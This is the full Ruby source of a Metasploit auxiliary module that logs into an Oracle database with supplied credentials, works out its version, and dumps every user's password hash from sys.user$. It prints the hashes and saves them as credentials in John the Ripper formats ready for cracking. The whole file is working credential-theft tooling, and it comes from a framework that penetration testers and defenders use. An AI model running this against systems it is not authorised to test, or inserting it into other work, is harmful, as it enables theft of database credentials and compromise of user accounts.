##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Module::UI::Message::Verbose

  def initialize
    super(
      'Name'           => 'Oracle Password Hashdump',
      'Description'    => %Q{
          This module dumps the usernames and password hashes
          from Oracle given the proper Credentials and SID.
          These are then stored as creds for later cracking using auxiliary/analyze/jtr_oracle_fast.
          This module supports Oracle DB versions 8i, 9i, 10g, 11g, and 12c.
      },
      'Author'         => ['theLightCosine'],
      'License'        => MSF_LICENSE
    )
  end

  def run_host(ip)
    return if not check_dependencies

    # Checks for Version of Oracle. Behavior varies with oracle version.
    # 12c uses SHA-512 (explained in more detail in report_hashes() below)
    # 11g uses SHA-1 while 8i-10g use DES
    query =  'select * from v$version'
    ver = prepare_exec(query)

    if ver.nil?
      print_error("An error has occurred while querying for the Oracle version. Please check your OPTIONS")
      return
    end

    unless ver.empty?
      case
      when ver[0].include?('8i')
        ver='8i'
      when ver[0].include?('9i')
        ver='9i'
      when ver[0].include?('10g')
        ver='10g'
      when ver[0].include?('11g')
        ver='11g'
      when ver[0].include?('12c')
        ver='12c'
      when ver[0].include?('18c')
        print_error("Version 18c is not currently supported")
        return
      else
        print_error("Error: Oracle DB version not supported.\nThis module supports Oracle DB versions 8i, 9i, 10g, 11g, and 12c.\nDumping unsupported version info:\n#{ver[0]}")
        return
      end
      vprint_status("Server is running version #{ver}")
    end

    this_service = report_service(
          :host  => datastore['RHOST'],
          :port => datastore['RPORT'],
          :name => 'oracle',
          :proto => 'tcp'
          )

    tbl = Rex::Text::Table.new(
      'Header'  => 'Oracle Server Hashes',
      'Indent'   => 1,
      'Columns' => ['Username', 'Hash']
    )

    begin
      case ver
      when '8i', '9i', '10g'    # Get the usernames and hashes for 8i-10g
        query='SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
        results= prepare_exec(query)
        unless results.empty?
          results.each do |result|
            row= result.split(/,/)
            tbl << row
          end
        end
      when '11g', '12c'    # Get the usernames and hashes for 11g or 12c
        query='SELECT name, spare4 FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
        results= prepare_exec(query)
        #print_status("Results: #{results.inspect}")
        unless results.empty?
          results.each do |result|
            row= result.split(/,/)
            next unless row.length == 2
            tbl << row
          end
        end
      end
    rescue => e
      print_error("An error occurred. The supplied credentials may not have proper privileges")
      return
    end
    print_status("Hash table :\n #{tbl}")
    report_hashes(tbl, ver, ip, this_service)
  end

  # Save each row in the hash table as credentials (shown by "creds" command)
  # This is done slightly differently, depending on the version
  def report_hashes(table, ver, ip, service)

    # Before module jtr_oracle_fast cracks these hashes, they are converted (based on jtr_format)
    # to a format that John The Ripper can handle. This format is stored here.
    case ver
    when '8i', '10g'
      jtr_format = "des,oracle"
    when '11g'
      jtr_format = "raw-sha1,oracle11"
    when '12c'
      jtr_format = "oracle12c"
    end

    service_data = {
      address: Rex::Socket.getaddress(ip),
      port: service[:port],
      protocol: service[:proto],
      service_name: service[:name],
      workspace_id: myworkspace_id
    }

    # For each row in the hash table, save its corresponding credential data and JTR format
    table.rows.each do |row|
      credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        username: row[0],
        private_data: row[1],
        private_type: :nonreplayable_hash,
        jtr_format: jtr_format
      }

      credential_core = create_credential(credential_data.merge(service_data))

      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      create_credential_login(login_data.merge(service_data))
    end
    print_good("Hash Table has been saved")
  end

end
